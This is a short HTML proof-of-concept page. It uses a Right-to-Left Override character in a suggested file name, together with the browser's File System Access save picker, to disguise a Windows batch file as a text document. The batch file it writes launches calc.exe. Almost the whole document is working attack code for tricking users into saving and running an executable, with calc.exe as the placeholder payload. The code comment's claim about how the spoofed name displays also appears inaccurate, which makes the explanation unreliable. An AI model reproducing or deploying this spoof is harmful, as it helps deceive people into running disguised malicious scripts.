<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Improved Extension Spoof - File System Access API</title>
</head>
<body>
  <h3>Improved File Save Trick - RTLO + No History</h3>
  <button id="save">Save File</button>

  <script>
    document.getElementById('save').addEventListener('click', async () => {
      // "txt" reversed using Right-to-Left Override: U+202E
      const spoofedName = 'report\u202eTAB.bat'; // appears as report.bat.txt

      const options = {
        suggestedName: spoofedName,
        types: [{
          description: 'Text Document',
          accept: {
            'application/x-msdownload': ['.bat']
          }
        }]
      };

      try {
        const handle = await window.showSaveFilePicker(options);
        const writable = await handle.createWritable();
        await writable.write(`@echo off\r\nstart calc.exe`);
        await writable.close();
        alert('File saved successfully!');
      } catch (err) {
        console.error(err);
        alert('User cancelled or error occurred');
      }
    });
  </script>
</body>
</html>
